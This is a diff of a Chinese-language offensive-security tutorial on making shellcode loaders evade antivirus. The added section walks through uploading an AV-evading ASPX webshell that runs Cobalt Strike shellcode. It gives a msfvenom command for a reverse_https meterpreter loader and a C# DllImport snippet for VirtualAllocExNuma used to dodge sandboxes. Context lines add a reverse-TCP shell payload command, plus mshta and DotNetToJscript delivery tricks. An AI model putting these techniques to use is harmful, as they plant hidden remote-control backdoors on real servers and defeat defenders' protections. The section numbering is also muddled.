@@ -4,8 +4,6 @@ title: Shellcode Bypass AV
 
 ---
 
-
-
 # Shellcode Bypass AV
 
 ## 0x01.Make a shellcode runner
@@ -198,7 +196,46 @@ Cobaltstrike 上线没有问题
 
 ![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210831231753.png)
 
-## 0x03.时间判断
+## 0x03.通过Encode shellcode 免杀webshell
+
+### 场景1：
+
+上传冰蝎马，马页面存在，但是webshell连接不上，上传天蝎马也连不上，然后上传普通的aspx小马，发现页面存在杀软，被拦截，考虑直接上传加载cobaltstrike shellcode的aspx免杀马上线
+
+![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210929000148.png)
+
+### 场景2：
+
+域内机器上面有杀软nod32，冰蝎原生没改的webshell被杀
+
+先用Msf制作一个aspx的加载器
+
+msfvenom  -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.106 LPORT=443 -f aspx -o meterpreter.aspx
+
+![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210929001658.png)
+
+我们把中间的shellcode替换成cobaltstrike的
+
+![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210929001951.png)
+
+导入VirtualAllocExNuma 和 GetCurrentProces的DllImport
+
+```c#
+    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true,
+ExactSpelling = true)]
+private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
+uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+[System.Runtime.InteropServices.DllImport("kernel32.dll")]
+private static extern IntPtr GetCurrentProcess();
+```
+
+解密上面加密过的shellcode
+
+![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210929002846.png)
+
+完成修改过的直接上线cs的webshell 测试上线
+
+## 0x04.时间判断
 
 如果在程序中加入一个延时效果，是否能够绕过Av的动态检测
 
@@ -262,7 +299,7 @@ svchost进程一般是system权限运行，所以低权限无法注入到高权�
 
 ![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210906145225.png)
 
-## 0x06.DoNetToJscript
+## 0x07.DoNetToJscript
 
 把代码放到DotNetToJscript中
 
@@ -296,7 +333,7 @@ https://www.jsjiami.com/javascriptobfuscator.html
 
 混淆后的代码一样可以上线
 
-## 0x07.MSHTA Bypass AV
+## 0x08.MSHTA Bypass AV
 
 在某些具体攻防场景中，可以直接使用mshta的上线方法，比如使用无回显可出网命令执行的情况，可以使用如下方法，mshta的具体免杀效果取决于js的免杀效果，在本文上一节，已经把木马转换成js，并且加密，所以mshta的效果也比较好
 
@@ -306,13 +343,13 @@ https://www.jsjiami.com/javascriptobfuscator.html
 
 
 
-## 0x08.MSHTA Bypass AV
+## 0x09.MSHTA Bypass AV
 
 0x06.签名注入shellcode
 
 ![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210908171430.png)
 
-## 0x09 Syscall调用shellcode
+## 0x10 Syscall调用shellcode
 
 用Msf测试做一个加密
 
@@ -326,7 +363,7 @@ msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.0.103 lport=5555 -f c -b
 
 ![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210921151031.png)
 
-## 0x10开源工具自动化免杀
+## 0x11开源工具自动化免杀
 
 使用开源工具https://github.com/aniqfakhrul/Sharperner
 
